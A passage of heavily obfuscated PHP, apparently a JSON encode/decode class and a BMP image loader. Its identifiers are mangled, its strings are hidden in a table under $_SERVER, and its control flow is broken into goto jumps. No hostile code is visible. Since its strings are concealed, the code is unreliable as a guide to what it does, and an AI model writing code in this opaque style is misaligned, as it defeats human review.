ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 2]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 3])); $eÄàº…îÅ¿ += 3; $Bæ½À¿¨¤è = $this->utf82utf16($CÈÄô®©¬˜); $f“ç‰çƒÔˆ .= sprintf($bÒ‹ƒ£È±[1953], bin2hex($Bæ½À¿¨¤è)); break; case ($Cğ†Á¨­îÓ & 252) == 248: $CÈÄô®©¬˜ = pack($bÒ‹ƒ£È±[1952], $Cğ†Á¨­îÓ, ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 1]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 2]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 3]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 4])); $eÄàº…îÅ¿ += 4; $Bæ½À¿¨¤è = $this->utf82utf16($CÈÄô®©¬˜); $f“ç‰çƒÔˆ .= sprintf($bÒ‹ƒ£È±[1953], bin2hex($Bæ½À¿¨¤è)); break; case ($Cğ†Á¨­îÓ & 254) == 252: $CÈÄô®©¬˜ = pack($bÒ‹ƒ£È±[1952], $Cğ†Á¨­îÓ, ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 1]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 2]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 3]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 4]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 5])); $eÄàº…îÅ¿ += 5; $Bæ½À¿¨¤è = $this->utf82utf16($CÈÄô®©¬˜); $f“ç‰çƒÔˆ .= sprintf($bÒ‹ƒ£È±[1953], bin2hex($Bæ½À¿¨¤è)); break; } } return $bÒ‹ƒ£È±[123] . $f“ç‰çƒÔˆ . $bÒ‹ƒ£È±[123]; case $bÒ‹ƒ£È±[1954]: if (is_array($fñ•µÒ‡ò÷) && count($fñ•µÒ‡ò÷) && array_keys($fñ•µÒ‡ò÷) !== range(0, sizeof($fñ•µÒ‡ò÷) - 1)) { $fè†¡Àà¬² = array_map(array($this, $bÒ‹ƒ£È±[1955]), array_keys($fñ•µÒ‡ò÷), array_values($fñ•µÒ‡ò÷)); foreach ($fè†¡Àà¬² as $dÀ÷‹§‘ÛÖ) { if (Services_JSON::isError($dÀ÷‹§‘ÛÖ)) { return $dÀ÷‹§‘ÛÖ; } } return $bÒ‹ƒ£È±[1075] . join($bÒ‹ƒ£È±[57], $fè†¡Àà¬²) . $bÒ‹ƒ£È±[324]; } $D®æÂ•®ØË = array_map(array($this, $bÒ‹ƒ£È±[1956]), $fñ•µÒ‡ò÷); foreach ($D®æÂ•®ØË as $bô±“¢µù—) { if (Services_JSON::isError($bô±“¢µù—)) { return $bô±“¢µù—; } } return $bÒ‹ƒ£È±[167] . join($bÒ‹ƒ£È±[57], $D®æÂ•®ØË) . $bÒ‹ƒ£È±[487]; case $bÒ‹ƒ£È±[1957]: $f¼ì÷ŠçµÌ = get_object_vars($fñ•µÒ‡ò÷); $fè†¡Àà¬² = array_map(array($this, $bÒ‹ƒ£È±[1955]), array_keys($f¼ì÷ŠçµÌ), array_values($f¼ì÷ŠçµÌ)); foreach ($fè†¡Àà¬² as $dÀ÷‹§‘ÛÖ) { if (Services_JSON::isError($dÀ÷‹§‘ÛÖ)) { return $dÀ÷‹§‘ÛÖ; } } return $bÒ‹ƒ£È±[1075] . join($bÒ‹ƒ£È±[57], $fè†¡Àà¬²) . $bÒ‹ƒ£È±[324]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $bÒ‹ƒ£È±[109] : new Services_JSON_Error(gettype($fñ•µÒ‡ò÷) . $bÒ‹ƒ£È±[1958]); } } function name_value($c¹Ğğ›×èÊ, $eÅùŠÆù) { $a—‘è¦ˆ¥ = $this->encode($eÅùŠÆù); if (Services_JSON::isError($a—‘è¦ˆ¥)) { return $a—‘è¦ˆ¥; } return $this->encode(strval($c¹Ğğ›×èÊ)) . $_SERVER[çŞáÓæÚô‚Ô‡][4] . $a—‘è¦ˆ¥; } function reduce_string($Bàİ´Œ–ß‰) { $c‘¾õÊÓëİ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bàİ´Œ–ß‰ = preg_replace(array($c‘¾õÊÓëİ[1959], $c‘¾õÊÓëİ[1960], $c‘¾õÊÓëİ[1961]), $c‘¾õÊÓëİ[43], $Bàİ´Œ–ß‰); return trim($Bàİ´Œ–ß‰); } function decode($F¦Ë¡·ˆ„) { $a¬‘ÁØ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F¦Ë¡·ˆ„ = $this->reduce_string($F¦Ë¡·ˆ„); switch (strtolower($F¦Ë¡·ˆ„)) { case $a¬‘ÁØ[1606]: return !0; case $a¬‘ÁØ[1608]: return !1; case $a¬‘ÁØ[109]: return null; default: $F•ÈŞ ì¸ = array(); if (is_numeric($F¦Ë¡·ˆ„)) { return (double) $F¦Ë¡·ˆ„ == (int) $F¦Ë¡·ˆ„ ? (int) $F¦Ë¡·ˆ„ : (double) $F¦Ë¡·ˆ„; } elseif (preg_match($a¬‘ÁØ[1962], $F¦Ë¡·ˆ„, $F•ÈŞ ì¸) && $F•ÈŞ ì¸[1] == $F•ÈŞ ì¸[2]) { $b’ìÏòÅµ = substr($F¦Ë¡·ˆ„, 0, 1); $F±‰†ÅÇ‡ˆ = substr($F¦Ë¡·ˆ„, 1, -1); $F¬èˆÛØë = $a¬‘ÁØ[43]; $E•”™†¶Ğ = strlen($F±‰†ÅÇ‡ˆ); for ($fñÒö‚Êà = 0; $fñÒö‚Êà < $E•”™†¶Ğ; ++$fñÒö‚Êà) { $eã÷îÙŞàí = substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 2); $EöçŠÛÃ­ = ord($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà]); switch (!0) { case $eã÷îÙŞàí == $a¬‘ÁØ[1950]: $F¬èˆÛØë .= chr(8); ++$fñÒö‚Êà; break; case $eã÷îÙŞàí == $a¬‘ÁØ[1583]: $F¬èˆÛØë .= chr(9); ++$fñÒö‚Êà; break; case $eã÷îÙŞàí == $a¬‘ÁØ[1581]: $F¬èˆÛØë .= chr(10); ++$fñÒö‚Êà; break; case $eã÷îÙŞàí == $a¬‘ÁØ[1951]: $F¬èˆÛØë .= chr(12); ++$fñÒö‚Êà; break; case $eã÷îÙŞàí == $a¬‘ÁØ[1582]: $F¬èˆÛØë .= chr(13); ++$fñÒö‚Êà; break; case $eã÷îÙŞàí == $a¬‘ÁØ[1363]: case $eã÷îÙŞàí == $a¬‘ÁØ[1963]: case $eã÷îÙŞàí == $a¬‘ÁØ[1576]: case $eã÷îÙŞàí == $a¬‘ÁØ[1578]: if ($b’ìÏòÅµ == $a¬‘ÁØ[123] && $eã÷îÙŞàí != $a¬‘ÁØ[1963] || $b’ìÏòÅµ == $a¬‘ÁØ[65] && $eã÷îÙŞàí != $a¬‘ÁØ[1363]) { $F¬èˆÛØë .= $F±‰†ÅÇ‡ˆ[++$fñÒö‚Êà]; } break; case preg_match($a¬‘ÁØ[1964], substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 6)): $Cê‡‰ùªÍÚ = chr(hexdec(substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà + 2, 2))) . chr(hexdec(substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà + 4, 2))); $F¬èˆÛØë .= $this->utf162utf8($Cê‡‰ùªÍÚ); $fñÒö‚Êà += 5; break; case $EöçŠÛÃ­ >= 32 && $EöçŠÛÃ­ <= 127: $F¬èˆÛØë .= $F±‰†ÅÇ‡ˆ[$fñÒö‚Êà]; break; case ($EöçŠÛÃ­ & 224) == 192: $F¬èˆÛØë .= substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 2); ++$fñÒö‚Êà; break; case ($EöçŠÛÃ­ & 240) == 224: $F¬èˆÛØë .= substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 3); $fñÒö‚Êà += 2; break; case ($EöçŠÛÃ­ & 248) == 240: $F¬èˆÛØë .= substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 4); $fñÒö‚Êà += 3; break; case ($EöçŠÛÃ­ & 252) == 248: $F¬èˆÛØë .= substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 5); $fñÒö‚Êà += 4; break; case ($EöçŠÛÃ­ & 254) == 252: $F¬èˆÛØë .= substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 6); $fñÒö‚Êà += 5; break; } } return $F¬èˆÛØë; } elseif (preg_match($a¬‘ÁØ[1965], $F¦Ë¡·ˆ„) || preg_match($a¬‘ÁØ[1966], $F¦Ë¡·ˆ„)) { goto föî‰ù‡¦š; cÀ¬ò„»­Å: for ($fñÒö‚Êà = 0; $fñÒö‚Êà <= $E•”™†¶Ğ; ++$fñÒö‚Êà) { $AÜ£Î²¬ = end($D‚š´Ò»…•); $eã÷îÙŞàí = substr($F±‰†ÅÇ‡ˆ, $fñÒö‚Êà, 2); if ($fñÒö‚Êà == $E•”™†¶Ğ || $F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[57] && $AÜ£Î²¬[$a¬‘ÁØ[1967]] == SERVICES_JSON_SLICE) { $C¬Ú…Ìà‚‘ = substr($F±‰†ÅÇ‡ˆ, $AÜ£Î²¬[$a¬‘ÁØ[272]], $fñÒö‚Êà - $AÜ£Î²¬[$a¬‘ÁØ[272]]); array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_SLICE, $a¬‘ÁØ[272] => $fñÒö‚Êà + 1, $a¬‘ÁØ[1968] => !1)); if (reset($D‚š´Ò»…•) == SERVICES_JSON_IN_ARR) { array_push($DïğÅÏø‘Ó, $this->decode($C¬Ú…Ìà‚‘)); } elseif (reset($D‚š´Ò»…•) == SERVICES_JSON_IN_OBJ) { $b†’§Ó«· = array(); if (preg_match($a¬‘ÁØ[1969], $C¬Ú…Ìà‚‘, $b†’§Ó«·)) { $CôÏÖß«å† = $this->decode($b†’§Ó«·[1]); $DàùØë¸¯» = $this->decode($b†’§Ó«·[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a„± ³ƒ§Ã[$CôÏÖß«å†] = $DàùØë¸¯»; } else { $a„± ³ƒ§Ã->{$CôÏÖß«å†} = $DàùØë¸¯»; } } elseif (preg_match($a¬‘ÁØ[1970], $C¬Ú…Ìà‚‘, $b†’§Ó«·)) { $CôÏÖß«å† = $b†’§Ó«·[1]; $DàùØë¸¯» = $this->decode($b†’§Ó«·[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a„± ³ƒ§Ã[$CôÏÖß«å†] = $DàùØë¸¯»; } else { $a„± ³ƒ§Ã->{$CôÏÖß«å†} = $DàùØë¸¯»; } } } } elseif (($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[123] || $F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[65]) && $AÜ£Î²¬[$a¬‘ÁØ[1967]] != SERVICES_JSON_IN_STR) { array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_IN_STR, $a¬‘ÁØ[272] => $fñÒö‚Êà, $a¬‘ÁØ[1968] => $F±‰†ÅÇ‡ˆ[$fñÒö‚Êà])); } elseif ($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $AÜ£Î²¬[$a¬‘ÁØ[1968]] && $AÜ£Î²¬[$a¬‘ÁØ[1967]] == SERVICES_JSON_IN_STR && (strlen(substr($F±‰†ÅÇ‡ˆ, 0, $fñÒö‚Êà)) - strlen(rtrim(substr($F±‰†ÅÇ‡ˆ, 0, $fñÒö‚Êà), $a¬‘ÁØ[103]))) % 2 != 1) { array_pop($D‚š´Ò»…•); } elseif ($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[167] && in_array($AÜ£Î²¬[$a¬‘ÁØ[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_IN_ARR, $a¬‘ÁØ[272] => $fñÒö‚Êà, $a¬‘ÁØ[1968] => !1)); } elseif ($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[487] && $AÜ£Î²¬[$a¬‘ÁØ[1967]] == SERVICES_JSON_IN_ARR) { array_pop($D‚š´Ò»…•); } elseif ($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[1075] && in_array($AÜ£Î²¬[$a¬‘ÁØ[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_IN_OBJ, $a¬‘ÁØ[272] => $fñÒö‚Êà, $a¬‘ÁØ[1968] => !1)); } elseif ($F±‰†ÅÇ‡ˆ[$fñÒö‚Êà] == $a¬‘ÁØ[324] && $AÜ£Î²¬[$a¬‘ÁØ[1967]] == SERVICES_JSON_IN_OBJ) { array_pop($D‚š´Ò»…•); } elseif ($eã÷îÙŞàí == $a¬‘ÁØ[1971] && in_array($AÜ£Î²¬[$a¬‘ÁØ[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_IN_CMT, $a¬‘ÁØ[272] => $fñÒö‚Êà, $a¬‘ÁØ[1968] => !1)); $fñÒö‚Êà++; } elseif ($eã÷îÙŞàí == $a¬‘ÁØ[1972] && $AÜ£Î²¬[$a¬‘ÁØ[1967]] == SERVICES_JSON_IN_CMT) { array_pop($D‚š´Ò»…•); $fñÒö‚Êà++; for ($d¾“…£›« = $AÜ£Î²¬[$a¬‘ÁØ[272]]; $d¾“…£›« <= $fñÒö‚Êà; ++$d¾“…£›«) { $F±‰†ÅÇ‡ˆ = substr_replace($F±‰†ÅÇ‡ˆ, $a¬‘ÁØ[60], $d¾“…£›«, 1); } } } if (reset($D‚š´Ò»…•) == SERVICES_JSON_IN_ARR) { return $DïğÅÏø‘Ó; } elseif (reset($D‚š´Ò»…•) == SERVICES_JSON_IN_OBJ) { return $a„± ³ƒ§Ã; } goto A¨ï÷ßÚ¾; f•‰ÙÒ©ƒó: $F±‰†ÅÇ‡ˆ = $this->reduce_string($F±‰†ÅÇ‡ˆ); if ($F±‰†ÅÇ‡ˆ == $a¬‘ÁØ[43]) { if (reset($D‚š´Ò»…•) == SERVICES_JSON_IN_ARR) { return $DïğÅÏø‘Ó; } else { return $a„± ³ƒ§Ã; } } $E•”™†¶Ğ = strlen($F±‰†ÅÇ‡ˆ); goto cÀ¬ò„»­Å; föî‰ù‡¦š: if ($F¦Ë¡·ˆ„[0] == $a¬‘ÁØ[167]) { $D‚š´Ò»…• = array(SERVICES_JSON_IN_ARR); $DïğÅÏø‘Ó = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D‚š´Ò»…• = array(SERVICES_JSON_IN_OBJ); $a„± ³ƒ§Ã = array(); } else { $D‚š´Ò»…• = array(SERVICES_JSON_IN_OBJ); $a„± ³ƒ§Ã = new stdClass(); } } array_push($D‚š´Ò»…•, array($a¬‘ÁØ[1967] => SERVICES_JSON_SLICE, $a¬‘ÁØ[272] => 0, $a¬‘ÁØ[1968] => !1)); $F±‰†ÅÇ‡ˆ = substr($F¦Ë¡·ˆ„, 1, -1); goto f•‰ÙÒ©ƒó; A¨ï÷ßÚ¾: } } } function isError($cô‘ô¿ô’Ã, $d³Îğ¸ãòÅ = null) { $B¯È¸¤«ñØ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (class_exists($B¯È¸¤«ñØ[1973])) { return PEAR::isError($cô‘ô¿ô’Ã, $d³Îğ¸ãòÅ); } elseif (is_object($cô‘ô¿ô’Ã) && (get_class($cô‘ô¿ô’Ã) == $B¯È¸¤«ñØ[1974] || is_subclass_of($cô‘ô¿ô’Ã, $B¯È¸¤«ñØ[1974]))) { return !0; } return !1; } } goto AøŸÙ”–‰µ; e…Óğœ³Ç†: class ImageGdBMP { public static function load($Aôê¶ğóÌõ) { $Dê¼°à = fopen($Aôê¶ğóÌõ, $_SERVER[çŞáÓæÚô‚Ô‡][1527]); if ($Dê¼°à === !1) { return !1; } $c…¤×¤‰É­ = self::loadFromStream($Dê¼°à); fclose($Dê¼°à); return $c…¤×¤‰É­; } public static function loadFromStream($c”‰³ƒ¬â) { $BØÜ¯Ø‹Œö =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÒ­ÖØ×À = fread($c”‰³ƒ¬â, 14); if ($eÒ­ÖØ×À === !1) { return !1; } if ($eÒ­ÖØ×À[0] != $BØÜ¯Ø‹Œö[1839] || $eÒ­ÖØ×À[1] != $BØÜ¯Ø‹Œö[1840]) { return !1; } $BÏÈË†ÊæÔ = unpack($BØÜ¯Ø‹Œö[1841] . $BØÜ¯Ø‹Œö[1842] . $BØÜ¯Ø‹Œö[1843] . $BØÜ¯Ø‹Œö[1844] . $BØÜ¯Ø‹Œö[1845], $eÒ­ÖØ×À); return self::loadFromStreamAndFileHeader($c”‰³ƒ¬â, $BÏÈË†ÊæÔ); } public static function loadFromStreamAndFileHeader($DÎâ“Ğ®Ë‡, array $f¥Ó†ÇáÛ±) { goto C„Ñ‘¢ëƒî; A“ò†Çª: $F®Ò·‡‰°˜ = abs($B‡‚Œ¢Üñ¥); $C‰©´¦‘£ = $B‡‚Œ¢Üñ¥ > 0 ? $F®Ò·‡‰°˜ - 1 : 0; $CÂƒ‹Ë°Èî = $B‡‚Œ¢Üñ¥ > 0 ? -1 : 1; goto d¦¤âìÍœ; cÔÇ‘ä©’: if ($AÙŒÛ ´° === !1) { return !1; } list(, $cìÍ¯ÂÕ¡) = unpack($EÏğ¿ó™ß¸[1846], $AÙŒÛ ´°); if ($cìÍ¯ÂÕ¡ == 12) { goto bğİÅçÈ; bğİÅçÈ: $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $cìÍ¯ÂÕ¡ - 4); if ($AÙŒÛ ´° === !1) { return !1; } extract(unpack($EÏğ¿ó™ß¸[1847] . $EÏğ¿ó™ß¸[1848] . $EÏğ¿ó™ß¸[1849] . $EÏğ¿ó™ß¸[1850], $AÙŒÛ ´°)); goto aÍÚë‚ÜÀĞ; aÍÚë‚ÜÀĞ: $D¡§ñ­î¯¤ = $B‰›ÁòõÉ = $fàÔî©®ØÆ = $F†“ñá«ª = 0; $aø–§Õæ³Á = 16711680; $e ø†æ°Û« = 65280; goto B“Ä„§ø; B“Ä„§ø: $b÷Ôê™îØ = 255; goto Aä‘’ˆÎ¸; Aä‘’ˆÎ¸: } else { if (124 < $cìÍ¯ÂÕ¡ || $cìÍ¯ÂÕ¡ < 40) { return !1; } else { goto AíĞŒõ‰Ù; C´æ—¿ÃŞ: if ($eø¥“”ÉÛ & 2147483648) { $eø¥“”ÉÛ = -(~$eø¥“”ÉÛ & 4294967295) - 1; } if ($B‡‚Œ¢Üñ¥ & 2147483648) { $B‡‚Œ¢Üñ¥ = -(~$B‡‚Œ¢Üñ¥ & 4294967295) - 1; } if ($E›ö”¡Ñæ & 2147483648) { $E›ö”¡Ñæ = -(~$E›ö”¡Ñæ & 4294967295) - 1; } goto eåÏ‰†×§ó; AíĞŒõ‰Ù: $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, 36); if ($AÙŒÛ ´° === !1) { return !1; } extract(unpack($EÏğ¿ó™ß¸[1851] . $EÏğ¿ó™ß¸[1852] . $EÏğ¿ó™ß¸[1849] . $EÏğ¿ó™ß¸[1853] . $EÏğ¿ó™ß¸[1854] . $EÏğ¿ó™ß¸[1855] . $EÏğ¿ó™ß¸[1856] . $EÏğ¿ó™ß¸[1857] . $EÏğ¿ó™ß¸[1858] . $EÏğ¿ó™ß¸[1859], $AÙŒÛ ´°)); goto C´æ—¿ÃŞ; eåÏ‰†×§ó: if ($aÅ¶åØ‹ÓÜ & 2147483648) { $aÅ¶åØ‹ÓÜ = -(~$aÅ¶åØ‹ÓÜ & 4294967295) - 1; } if ($f¥Ó†ÇáÛ±[$EÏğ¿ó™ß¸[531]] != 0) { $CŸÖÉ×öÕö = $EÇàù¶‘•Æ == 1 || $EÇàù¶‘•Æ == 4 || $EÇàù¶‘•Æ == 8 ? ($D¡§ñ­î¯¤ ? $D¡§ñ­î¯¤ : pow(2, $EÇàù¶‘•Æ)) << 2 : 0; $b´Ë®Å¹®ï = $FòÏ†êÆİ— ? $FòÏ†êÆİ— : ($eø¥“”ÉÛ * $EÇàù¶‘•Æ + 31 >> 3 & ~3) * abs($B‡‚Œ¢Üñ¥); $B©ï‘¿‘ƒ‚ = $f¥Ó†ÇáÛ±[$EÏğ¿ó™ß¸[531]] - $b´Ë®Å¹®ï - $CŸÖÉ×öÕö - 14; if ($cìÍ¯ÂÕ¡ < $B©ï‘¿‘ƒ‚ && 40 <= $cìÍ¯ÂÕ¡ && $cìÍ¯ÂÕ¡ <= 124) { $cìÍ¯ÂÕ¡ = $B©ï‘¿‘ƒ‚; } } if ($cìÍ¯ÂÕ¡ - 40 > 0) { $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $cìÍ¯ÂÕ¡ - 40); if ($AÙŒÛ ´° === !1) { return !1; } extract(unpack($EÏğ¿ó™ß¸[1860] . $EÏğ¿ó™ß¸[1861] . $EÏğ¿ó™ß¸[1862] . $EÏğ¿ó™ß¸[1863], $AÙŒÛ ´° . str_repeat($EÏğ¿ó™ß¸[1864], 120))); } else { $fàÔî©®ØÆ = $aø–§Õæ³Á = $e ø†æ°Û« = $b÷Ôê™îØ = 0; } goto bØôˆË¬²Ò; bØôˆË¬²Ò: if (($EÇàù¶‘•Æ == 16 || $EÇàù¶‘•Æ == 24 || $EÇàù¶‘•Æ == 32) && $F†“ñá«ª == 0 && $aø–§Õæ³Á == 0 && $e ø†æ°Û« == 0 && $b÷Ôê™îØ == 0) { switch ($EÇàù¶‘•Æ) { case 16: $aø–§Õæ³Á = 31744; $e ø†æ°Û« = 992; $b÷Ôê™îØ = 31; break; case 24: case 32: $aø–§Õæ³Á = 16711680; $e ø†æ°Û« = 65280; $b÷Ôê™îØ = 255; break; } } goto a†‡ÈïÇ—Ş; a†‡ÈïÇ—Ş: } } goto aÏó•ùæ ù; C„Ñ‘¢ëƒî: $EÏğ¿ó™ß¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($f¥Ó†ÇáÛ±[$EÏğ¿ó™ß¸[397]] != 19778) { return !1; } $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, 4); goto cÔÇ‘ä©’; d¦¤âìÍœ: if ($EÇàù¶‘•Æ == 1 || $EÇàù¶‘•Æ == 4 || $EÇàù¶‘•Æ == 8) { goto Fˆ©ÏÍÔÃÍ; D…ÀƒÛ: $aËÙ´”èÂ× = (1 << $EÇàù¶‘•Æ) - 1 << $b‘ÕèÛº¬©; if ($F†“ñá«ª == 1 || $F†“ñá«ª == 2) { $Cæ÷ŞèÍƒŠ = 0; $a˜£…ùƒÌ£ = $EÇàù¶‘•Æ >> 2 & 1; for (;;) { if ($Cæ÷ŞèÍƒŠ < -1 || $Cæ÷ŞèÍƒŠ > $eø¥“”ÉÛ || $C‰©´¦‘£ < -1 || $C‰©´¦‘£ > $B‡‚Œ¢Üñ¥) { imagedestroy($B‡ß ‡‚ÒË); return !1; } $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, 1); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } switch ($AÙŒÛ ´°) { case $EÏğ¿ó™ß¸[1864]: $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, 1); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } switch ($AÙŒÛ ´°) { case $EÏğ¿ó™ß¸[1864]: $C‰©´¦‘£ += $CÂƒ‹Ë°Èî; $Cæ÷ŞèÍƒŠ = 0; break; case $EÏğ¿ó™ß¸[1866]: $C‰©´¦‘£ = 0; $Cæ÷ŞèÍƒŠ = 0; break 3; case $EÏğ¿ó™ß¸[1867]: $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, 2); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } list(, $f©À—Ê®–ˆ, $C™‹•éÕÜñ) = unpack($EÏğ¿ó™ß¸[1868], $AÙŒÛ ´°); $Cæ÷ŞèÍƒŠ += $f©À—Ê®–ˆ; $C‰©´¦‘£ += $C™‹•éÕÜñ * $CÂƒ‹Ë°Èî; break; default: list(, $eøçáÙ‹˜×) = unpack($EÏğ¿ó™ß¸[1869], $AÙŒÛ ´°); $FóÈæ½Ş‰ = ($eøçáÙ‹˜× >> $a˜£…ùƒÌ£) + ($eøçáÙ‹˜× & $a˜£…ùƒÌ£); $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $FóÈæ½Ş‰ + 1 & ~1); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } for ($e˜ƒ‡¶„—™ = 0, $dêÍÔöšÇï = 0; $e˜ƒ‡¶„—™ < $eøçáÙ‹˜×; ++$e˜ƒ‡¶„—™, ++$Cæ÷ŞèÍƒŠ, $dêÍÔöšÇï += $EÇàù¶‘•Æ) { list(, $eÔ–ãÙ¶¦Ì) = unpack($EÏğ¿ó™ß¸[1869], $AÙŒÛ ´°[$dêÍÔöšÇï >> 3]); $F«Ø§ÀõÎ = $dêÍÔöšÇï & 7; imagesetpixel($B‡ß ‡‚ÒË, $Cæ÷ŞèÍƒŠ, $C‰©´¦‘£, $DÒà„‡™‚æ[($eÔ–ãÙ¶¦Ì & $aËÙ´”èÂ× >> $F«Ø§ÀõÎ) >> $b‘ÕèÛº¬© - $F«Ø§ÀõÎ]); } break; } break; default: $C¤ÃÉ–ÏàŒ = fread($DÎâ“Ğ®Ë‡, 1); if ($C¤ÃÉ–ÏàŒ === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } list(, $B®Œ›ğÖ™, $eÔ–ãÙ¶¦Ì) = unpack($EÏğ¿ó™ß¸[1868], $AÙŒÛ ´° . $C¤ÃÉ–ÏàŒ); for ($e˜ƒ‡¶„—™ = 0, $dêÍÔöšÇï = 0; $e˜ƒ‡¶„—™ < $B®Œ›ğÖ™; ++$e˜ƒ‡¶„—™, ++$Cæ÷ŞèÍƒŠ, $dêÍÔöšÇï += $EÇàù¶‘•Æ) { $F«Ø§ÀõÎ = $dêÍÔöšÇï & 7; imagesetpixel($B‡ß ‡‚ÒË, $Cæ÷ŞèÍƒŠ, $C‰©´¦‘£, $DÒà„‡™‚æ[($eÔ–ãÙ¶¦Ì & $aËÙ´”èÂ× >> $F«Ø§ÀõÎ) >> $b‘ÕèÛº¬© - $F«Ø§ÀõÎ]); } break; } } } else { for ($Fï¯ÆŸÁ = 0; $Fï¯ÆŸÁ < $F®Ò·‡‰°˜; ++$Fï¯ÆŸÁ, $C‰©´¦‘£ += $CÂƒ‹Ë°Èî) { $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $eñÖÔÂÁİö); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } $dêÍÔöšÇï = 0; for ($Cæ÷ŞèÍƒŠ = 0; $Cæ÷ŞèÍƒŠ < $eø¥“”ÉÛ; ++$Cæ÷ŞèÍƒŠ, $dêÍÔöšÇï += $EÇàù¶‘•Æ) { list(, $eÔ–ãÙ¶¦Ì) = unpack($EÏğ¿ó™ß¸[1869], $AÙŒÛ ´°[$dêÍÔöšÇï >> 3]); $F«Ø§ÀõÎ = $dêÍÔöšÇï & 7; imagesetpixel($B‡ß ‡‚ÒË, $Cæ÷ŞèÍƒŠ, $C‰©´¦‘£, $DÒà„‡™‚æ[($eÔ–ãÙ¶¦Ì & $aËÙ´”èÂ× >> $F«Ø§ÀõÎ) >> $b‘ÕèÛº¬© - $F«Ø§ÀõÎ]); } } } goto féæ°‹™òË; fÕ¦´Ú‡õö: $DÒà„‡™‚æ = array(); for ($e˜ƒ‡¶„—™ = 0; $e˜ƒ‡¶„—™ < $bˆ³ƒë®È‡; ++$e˜ƒ‡¶„—™) { $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $dÎğ‹Ãœ Á); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } extract(unpack($EÏğ¿ó™ß¸[1865], $AÙŒÛ ´° . $EÏğ¿ó™ß¸[1864])); $DÒà„‡™‚æ[] = imagecolorallocate($B‡ß ‡‚ÒË, $AÎ¥¸–Éîù, $cÊ§’é¥© , $F«Ø§ÀõÎ); } $b‘ÕèÛº¬© = 8 - $EÇàù¶‘•Æ; goto D…ÀƒÛ; Fˆ©ÏÍÔÃÍ: $B‡ß ‡‚ÒË = imagecreate($eø¥“”ÉÛ, $F®Ò·‡‰°˜); $dÎğ‹Ãœ Á = $cìÍ¯ÂÕ¡ == 12 ? 3 : 4; $bˆ³ƒë®È‡ = $D¡§ñ­î¯¤ ? $D¡§ñ­î¯¤ : pow(2, $EÇàù¶‘•Æ); goto fÕ¦´Ú‡õö; féæ°‹™òË: } else { goto dŒºÈˆöÂ¿; açäÄä†“: for ($Fï¯ÆŸÁ = 0; $Fï¯ÆŸÁ < $F®Ò·‡‰°˜; 